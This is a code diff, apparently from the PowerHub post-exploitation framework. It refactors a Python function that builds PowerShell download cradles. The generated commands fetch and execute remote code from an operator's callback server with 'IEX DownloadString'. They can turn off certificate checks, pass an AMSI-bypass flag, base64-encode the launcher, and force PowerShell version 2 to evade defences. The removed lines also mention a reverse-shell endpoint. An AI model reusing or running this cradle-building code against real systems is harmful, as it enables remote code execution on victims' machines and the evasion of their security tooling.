@@ -1,7 +1,8 @@
-from powerhub.args import args
-from powerhub.directories import BASE_DIR, MOD_DIR
 import os
 import binascii
+
+from powerhub.env import powerhub_app as ph_app
+from powerhub.directories import BASE_DIR, MOD_DIR
 
 
 def import_module_type(mod_type, filter=lambda x: True):
@@ -88,72 +89,68 @@ modules = import_modules()
 
 callback_urls = {
     'http': 'http://%s:%d/%s' % (
-        args.URI_HOST,
-        args.URI_PORT if args.URI_PORT else args.LPORT,
-        args.URI_PATH+'/' if args.URI_PATH else '',
+        ph_app.args.URI_HOST,
+        ph_app.args.URI_PORT if ph_app.args.URI_PORT else ph_app.args.LPORT,
+        ph_app.args.URI_PATH+'/' if ph_app.args.URI_PATH else '',
     ),
     'https': 'https://%s:%d/%s' % (
-        args.URI_HOST,
-        args.URI_PORT if args.URI_PORT else args.SSL_PORT,
-        args.URI_PATH+'/' if args.URI_PATH else '',
+        ph_app.args.URI_HOST,
+        ph_app.args.URI_PORT if ph_app.args.URI_PORT else ph_app.args.SSL_PORT,
+        ph_app.args.URI_PATH+'/' if ph_app.args.URI_PATH else '',
     ),
 }
 
 # TODO consider https
 webdav_url = 'http://%s:%d/webdav' % (
-    args.URI_HOST,
-    args.LPORT,
+    ph_app.args.URI_HOST,
+    ph_app.args.LPORT,
 )
 
-endpoints = {
-    'hub': "h",
-    'reverse_shell': "r",
-}
 
-
-def build_cradle(get_args, flavor="hub"):
+def build_cradle(get_args):
     result = ""
-    from powerhub.reverseproxy import FINGERPRINT
-    if get_args['GroupTransport'] == 'https':
-        if get_args['RadioNoVerification'] == 'true':
+    if get_args['Transport'] == 'https':
+        if get_args['NoVerification'] == 'true':
             result += ("[System.Net.ServicePointManager]::ServerCertificate"
                        "ValidationCallback={$true};")
-        elif get_args['RadioFingerprint'] == 'true':
+        elif get_args['Fingerprint'] == 'true':
+            from powerhub.reverseproxy import FINGERPRINT
             result += ("[System.Net.ServicePointManager]::ServerCertificate"
                        "ValidationCallback={param($1,$2);"
                        "$2.Thumbprint -eq '%s'};" %
                        FINGERPRINT.replace(':', ''))
-        elif get_args['RadioCertStore'] == 'true':
+        elif get_args['CertStore'] == 'true':
             pass
-        if get_args['CheckboxTLS1.2'] == 'true':
+        if get_args['TLS1.2'] == 'true':
             result += ("[Net.ServicePointManager]::SecurityProtocol="
                        "[Net.SecurityProtocolType]::Tls12;")
 
-    if get_args['GroupTransport'].startswith('http'):
+    if get_args['Transport'].startswith('http'):
         result += "$K=New-Object Net.WebClient;"
-        if get_args['CheckboxProxy'] == 'true':
+        if get_args['Proxy'] == 'true':
             result += ("$K.Proxy=[Net.WebRequest]::GetSystemWebProxy();"
                        "$K.Proxy.Credentials=[Net.CredentialCache]::"
                        "DefaultCredentials;")
-        if not get_args['GroupClipExec'] == 'none':
-            clip_exec = "&c=%s" % get_args['GroupClipExec']
+        if not get_args['ClipExec'] == 'none':
+            clip_exec = "&c=%s" % get_args['ClipExec']
         else:
             clip_exec = ""
-        result += "IEX $K.DownloadString('%s0?t=%s&f=%s&a=%s%s');"
+        result += "IEX $K.DownloadString('%s0?t=%s&a=%s%s');"
         result = result % (
-            callback_urls[get_args['GroupTransport']],
-            get_args['GroupTransport'],
-            endpoints[flavor],
-            get_args['GroupAmsi'],
+            callback_urls[get_args['Transport']],
+            get_args['Transport'],
+            get_args['Amsi'],
             clip_exec,
         )
 
-    if get_args['GroupLauncher'] == 'cmd':
-        result = 'powershell.exe "%s"' % result
-    elif get_args['GroupLauncher'] == 'cmd_enc':
-        result = 'powershell.exe -Enc %s' % \
-            binascii.b2a_base64(result.encode('utf-16le')).decode()
-    elif get_args['GroupLauncher'] == 'bash':
+    powershell_exe = 'powershell.exe -v 2'
+    if get_args['Launcher'] == 'cmd':
+        result = '%s "%s"' % (powershell_exe, result)
+    elif get_args['Launcher'] == 'cmd_enc':
+        result = '%s -Enc %s' % (
+            powershell_exe,
+            binascii.b2a_base64(result.encode('utf-16le')).decode())
+    elif get_args['Launcher'] == 'bash':
         result = result.replace('$', '\\$')
-        result = '"powershell.exe \\\"%s\\\""' % result
+        result = '"%s \\\"%s\\\""' % (powershell_exe, result)
     return result
